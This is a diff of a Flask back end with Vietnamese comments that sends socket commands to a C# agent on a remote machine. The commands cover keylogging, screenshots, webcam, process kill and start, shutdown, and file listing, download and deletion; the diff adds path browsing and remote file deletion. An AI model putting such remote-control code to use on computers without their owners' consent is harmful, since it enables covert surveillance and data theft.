@@ -34,33 +34,30 @@ def recvall(sock, n):
 # Hàm trung tâm: Gửi lệnh Socket sang C# Server và xử lý phản hồi
 # File: app.py (Cập nhật hàm send_command_to_server)
 
-def send_command_to_server(command_type, sub_command=None, args=None):
+def send_command_to_server(command_type, sub_command=None, args=None, file_content=None):
     response_data = None
     status = "error"
     msg = ""
     client = None
 
     try:
-        # 1. Kết nối Socket
+        # 1. Kết nối
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.settimeout(10)
         client.connect((HOST, PORT))
         writer = client.makefile('w', encoding='utf-8', newline='\r\n')
         reader = client.makefile('r', encoding='utf-8', newline='\r\n')
 
-        # --- KHÔNG CÒN GỬI LỆNH TỰ ĐỘNG Ở ĐÂY NỮA ---
-        # Mỗi "if" bên dưới sẽ tự quyết định gửi gì.
+        # === 2. XỬ LÝ GỬI LỆNH THEO TỪNG NHÓM (KHÔNG GỬI TỰ ĐỘNG Ở ĐẦU NỮA) ===
 
-        # === NHÓM 1: CÁC MODULE CŨ (Cần gửi Header trước) ===
+        # --- NHÓM LỆNH HỆ THỐNG CƠ BẢN ---
         if command_type in ["PROCESS", "APPLICATION", "KEYLOG", "TAKEPIC", "SHUTDOWN", "RESTART"]:
-            # Tự gửi Header của chính mình
-            writer.write(f"{command_type}\n") 
+            writer.write(f"{command_type}\n") # Tự gửi Header
             writer.flush()
-
-            # --- Logic bên trong giữ nguyên ---
+            
+            # (Giữ nguyên logic xử lý của nhóm này như cũ)
             if command_type == "TAKEPIC":
                 client.sendall(b"TAKE\n")
-                # (Logic đọc ảnh giữ nguyên...)
                 size_buffer = b""
                 while True:
                     char = client.recv(1)
@@ -98,9 +95,9 @@ def send_command_to_server(command_type, sub_command=None, args=None):
                     writer.write("XEM\n")
                     writer.flush()
                     try:
-                        line = reader.readline()
-                        if line:
-                            count = int(line.strip())
+                        count_str = reader.readline().strip()
+                        if count_str and count_str.isdigit():
+                            count = int(count_str)
                             data_list = []
                             for _ in range(count):
                                 p_name = reader.readline().strip()
@@ -109,43 +106,37 @@ def send_command_to_server(command_type, sub_command=None, args=None):
                                 data_list.append({"name": p_name, "id": p_id, "threads": p_threads})
                             response_data = data_list
                             status = "success"
-                    except: msg = "Lỗi đọc dữ liệu Process"
-                
+                    except: msg = "Lỗi đọc Process"
                 elif sub_command in ["KILL", "START"]:
                     writer.write(f"{sub_command}\n")
                     writer.write(f"{sub_command}ID\n")
-                    # Xử lý args
                     final_args = args
-                    if sub_command == "START" and args:
-                        if args.lower() in APP_ALIASES: final_args = APP_ALIASES[args.lower()]
+                    if sub_command == "START" and args and args.lower() in APP_ALIASES:
+                        final_args = APP_ALIASES[args.lower()]
                     writer.write(f"{final_args}\n")
                     writer.flush()
-                    
                     res = reader.readline()
-                    status = "success" if "Successfully" in res else "error"
+                    status = "success" if "Success" in res else "error"
                     msg = res.strip()
-                
                 writer.write("QUIT\n")
                 writer.flush()
 
-        # === NHÓM 2: WEBCAM (Gửi lệnh trực tiếp, KHÔNG gửi Header 'WEBCAM') ===
+        # --- NHÓM WEBCAM ---
         elif command_type == "WEBCAM":
-            # Gửi thẳng sub_command (ví dụ: WEBCAM_START)
-            writer.write(f"{sub_command}\n")
+            writer.write(f"{sub_command}\n") # Gửi thẳng lệnh con (WEBCAM_START...)
             writer.flush()
-            
-            # Đọc phản hồi
-            resp = reader.readline().strip()
-            msg = resp
+            msg = reader.readline().strip()
             status = "success"
-            
             writer.write("QUIT\n")
             writer.flush()
 
-        # === NHÓM 3: FILE MANAGER (Gửi lệnh trực tiếp, KHÔNG gửi Header 'FILE') ===
+        # --- NHÓM FILE EXPLORER (NÂNG CẤP) ---
         elif command_type == "FILE":
             if sub_command == "GET_FILES":
-                writer.write("GET_FILES\n") # Gửi thẳng lệnh này sang C#
+                writer.write("GET_FILES\n")
+                # Gửi đường dẫn (nếu không có thì gửi ROOT)
+                path = args if args else "ROOT"
+                writer.write(f"{path}\n")
                 writer.flush()
                 
                 count_str = reader.readline().strip()
@@ -153,20 +144,25 @@ def send_command_to_server(command_type, sub_command=None, args=None):
                     count = int(count_str)
                     file_list = []
                     for _ in range(count):
-                        f_name = reader.readline().strip()
-                        f_size = reader.readline().strip()
-                        try:
-                            s = int(f_size)
-                            sz = f"{s/1024/1024:.2f} MB" if s > 1024*1024 else f"{s/1024:.2f} KB"
-                        except: sz = "Unknown"
-                        file_list.append({"name": f_name, "size": sz})
+                        # Đọc format: [TYPE]|NAME|SIZE
+                        raw = reader.readline().strip()
+                        parts = raw.split('|')
+                        if len(parts) >= 3:
+                            file_list.append({"type": parts[0], "name": parts[1], "size": parts[2]})
                     response_data = file_list
                     status = "success"
-                else: msg = "Lỗi: " + count_str
+                else: msg = "Lỗi đọc danh sách"
+
+            elif sub_command == "DELETE":
+                writer.write("DELETE_FILE\n")
+                writer.write(f"{args}\n") # Gửi đường dẫn cần xóa
+                writer.flush()
+                msg = reader.readline().strip()
+                status = "success"
 
             elif sub_command == "DOWNLOAD":
-                writer.write("DOWNLOAD_FILE\n") # Gửi thẳng lệnh này sang C#
-                writer.write(f"{args}\n")       # Gửi tên file
+                writer.write("DOWNLOAD_FILE\n")
+                writer.write(f"{args}\n") # Gửi đường dẫn file
                 writer.flush()
                 
                 size_str = reader.readline().strip()
@@ -176,18 +172,17 @@ def send_command_to_server(command_type, sub_command=None, args=None):
                         response_data = base64.b64encode(f_data).decode('utf-8')
                         status = "success"
                     else: msg = "Lỗi tải dữ liệu"
-                else: msg = "File không tồn tại"
+                else: msg = "File không tồn tại hoặc rỗng"
 
-            writer.write("QUIT\n") # Ngắt kết nối socket này
+            writer.write("QUIT\n")
             writer.flush()
 
     except Exception as e:
-        msg = f"Lỗi Server: {str(e)}"
+        msg = f"Lỗi kết nối: {str(e)}"
     finally:
         if client: client.close()
 
     return {"status": status, "data": response_data, "message": msg}
-
 # --- CÁC API ROUTES (Endpoints cho Frontend gọi) ---
 
 @app.route('/')
